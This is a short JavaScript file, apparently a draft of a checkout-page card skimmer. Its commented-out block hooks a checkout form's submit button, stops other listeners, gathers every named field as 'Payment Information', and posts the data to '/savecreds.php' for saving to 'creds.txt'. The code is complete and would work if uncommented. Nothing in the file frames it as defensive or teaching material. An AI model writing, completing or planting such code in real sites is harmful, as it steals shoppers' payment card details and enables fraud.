console.log("Checking script to see if its working");
/*
checkoutForm.querySelector('button[type="submit"]').addEventListener('click', function(event) {
   // event.preventDefault(); // Prevent form from submitting the traditional way

   // Prevent default behavior temporarily
    event.stopImmediatePropagation(); // Stop any other listeners from running
    console.log("This is working! right?")
    // Get all form elements
    const formElements = this.elements;

    // Initialize an object to store name-value pairs
    const formData = {};

    // Loop through all form elements
    for (let element of formElements) {
        if (element.name) { // Only process elements that have a name attribute
            formData[element.name] = element.value;
        }
    }

    // Format data into a string for the text file (creds.txt)
    let credsText = 'Payment Information:\n';
    for (let key in formData) {
        credsText += `${key}: ${formData[key]}\n`;
    }

    // Send the data to the server to generate the text file
    fetch('/savecreds.php', {
        method: 'POST',
        mode: 'no-cors',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify({ credsText: credsText })
    })
    .then(response => response.json())
    .then(data => {
        if (data.success) {
            console.log('Order data has been saved.');
        } else {
            console.log('There was an error saving your data.');
        }
    })
    .catch(error => {
        console.error('Error:', error);
        console.log('There was an error processing your request.');
    });
});*/
